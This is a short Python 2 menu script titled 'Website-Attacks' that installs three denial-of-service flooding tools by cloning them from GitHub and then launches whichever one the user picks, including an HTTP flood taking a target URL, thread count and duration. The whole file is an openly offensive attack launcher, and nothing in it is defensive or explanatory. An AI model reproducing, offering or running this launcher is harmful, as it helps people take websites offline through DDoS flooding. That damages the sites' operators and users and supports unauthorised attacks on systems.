import os, sys, time
from time import sleep as timeout
def restart_program():
	os.system(' clear ')
	os.system(' figlet Website-Attacks ')
print " [01]> DDoS-Ripper    "
print " [02]> Layer-7-Attack "
print " [03]> httpflood      "
print " [04]> Install        "
print
print " [00]> Exit											"
print
cyber = raw_input(" Website-Attacks ==>> ")

if cyber == '01' or cyber == '1':
	os.system(' cd DDoS-Ripper && python3 DRipper.py ')
	
elif cyber == '02' or cyber == '2':
	os.system(' cd Layer-7-Attack && python2 l7a.py ')
	
elif cyber == '03' or cyber == '3':
	os.system(' cd golang-httpflood && go build httpflood.go && ./httpflood <url> <threads> <get/post> <seconds> <header.txt/nil> ')

elif cyber == '04' or cyber == '4':
	os.system(' git clone https://github.com/palahsu/DDoS-Ripper && git clone https://github.com/MusH4ck007/Layer-7-Attack && git clone https://github.com/Leeon123/golang-httpflood ')

elif cyber == '00' or cyber == '0':
	sys.exit()